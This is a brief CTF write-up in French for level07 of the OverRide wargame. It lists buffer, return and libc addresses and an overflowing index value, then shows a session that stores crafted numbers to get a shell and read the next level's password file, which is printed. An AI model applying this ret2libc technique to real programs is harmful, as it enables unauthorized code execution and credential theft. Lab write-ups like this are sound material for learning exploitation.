Principe de canary + index % 3 bloqué

adresse de debut du buffer => 0xFFFFD574
adresse a overwrite => 0xFFFFD73C
index a rentrer => 1073741938
adress de system => 0xf7e6aed0
adress de bin/sh => 0xF7F897EC


```
evel07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /homne/users/level08/.pass
cat: /homne/users/level08/.pass: No such file or directory
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```